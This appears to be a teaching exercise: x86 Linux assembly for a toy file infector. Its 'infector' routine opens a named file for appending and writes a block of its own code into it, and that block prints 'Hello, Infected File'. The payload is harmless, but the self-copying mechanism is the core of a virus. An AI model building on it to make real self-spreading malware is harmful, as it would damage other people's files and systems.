section .text
global _start
global system_call
global code_start
global infection
global code_end
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    open:
	mov eax, 5           ; system call for open
    	mov ebx, [ebp+8]        ; filename string pointer as argument
    	mov ecx, 1025          ; APPEND and WRITE mode
    	mov edx, 0777           ; rwx permision
    	int 0x80                ; Transfer control to the kernel
    write:
	push eax
	mov ebx,eax
	mov eax, 4
	mov ecx, code_start
	mov edx, code_end-code_start
	int 0x80
    close:
	pop ebx
	mov eax, 6
	int 0x80
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
    msg: db "Hello, Infected File",10,0
    len: equ $-msg
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    ;sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    mov     esi, [ebp+8]    ; Copy function args to registers: leftmost...
    loop:
    	mov	edx,len		; message length
        mov	ecx,msg		; message to write
    	mov	ebx,1		; file descriptor (stdout)
    	mov	eax,4		; system call number (sys_write)
    	int	0x80		; call kernel
    	dec esi
	cmp esi,0
    	jg loop
	popad
	mov esp, ebp
    	pop ebp             ; Restore caller state
	ret
code_end:
    

 
